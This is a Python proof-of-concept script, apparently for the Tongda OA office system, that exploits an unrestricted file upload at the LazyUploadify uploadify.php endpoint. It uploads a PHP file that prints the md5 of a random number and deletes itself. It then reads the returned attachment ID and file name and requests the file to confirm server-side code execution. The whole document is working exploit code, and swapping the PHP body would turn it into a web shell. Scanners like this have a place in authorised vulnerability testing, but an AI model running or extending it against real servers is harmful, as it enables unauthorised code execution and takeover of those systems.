import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
f1=randomInt(40000, 44800)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
rboundary=randomLowercase(8)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
randname=randomLowercase(6)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"general/weibo/javascript/LazyUploadify/uploadify.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"general/weibo/javascript/LazyUploadify/uploadify.php"
	body='''------WebKitFormBoundary'''+rboundary+'''
Content-Disposition: form-data; name="Filedata"; filename="'''+randname+'''.php"
Content-Type: application/octet-stream

<?php echo md5('''+str(f1)+''');unlink(__FILE__);?>
------WebKitFormBoundary'''+rboundary+'''--'''
	headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'+rboundary}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "attachmentID" in response.text:
		r1=True
		try:
			aid=re.findall("\"attachmentID\"\\s?:(\\d+),",response.text)[0]
			fname=re.findall("\"attachmentName\":\"(.*?\\.php)\"",response.text)[0]
		except:
			aid=''
			fname=''
	else:
		aid=''
		fname=''
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"attachment/{aid}/{fname}"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
